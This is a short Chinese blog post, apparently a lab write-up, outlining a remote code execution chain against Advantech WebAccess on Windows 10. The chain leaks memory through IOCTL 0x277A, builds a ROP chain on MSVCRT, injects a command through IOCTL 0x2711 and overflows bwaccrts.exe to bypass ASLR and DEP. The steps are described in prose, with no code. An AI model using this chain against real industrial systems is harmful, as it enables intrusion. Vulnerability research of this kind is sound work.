Advantech WebAccess 0x2711 IOCTL RCE

发表于 2022-05-22 分类于 Windows Exploitation 阅读次数： Valine：

本次实验讨论在Win10 21h2 x86系统，程序未开启ASLR，所以当初的栈溢出利用很简单，这里将程序加入WDEG，默认开启DEP和ASLR，使用IDA和Windbg相结合的方式对其进行分析。

安装程序可以从Exploit-DB上下载：https://www.exploit-db.com/exploits/44278

在小于78h下面的分支中，发现一个有意思的地方：

调用了fopen函数，如果该函数没有关闭打开的文件句柄，是可以导致内存信息泄露的，跟进发现fopen后续没有对应的关闭句柄操作。因为程序开启了ASLR，可以通过这个地方的脆弱点导致内存信息泄露，进而bypass ASLR。

fopen的参数是我们可以控制的，注意fopen每个参数代表的意义。先来确定需要多少字符才能覆盖到ecx和eax。

现在命令注入只能启动系统已有的程序（包括自带的或其他安装的程序），为了能够触发RCE，考虑是否可以触发一个程序，然后该程序存在栈溢出，这样就可以触发RCE。

漏洞点在sscanf函数，因为我们控制的输入会传入sscanf函数，最终导致栈溢出。

梳理一下RCE的利用流程：

1.利用0x277A的内存信息泄露获取MSVCRT.dll的基地址

2.构建基于MSVCRT.dll的ROP链

3.利用0x2711的代码注入漏洞，启动bwaccrts.exe

4.栈溢出bwaccrts.exe

5.最终绕过ASLR和DEP
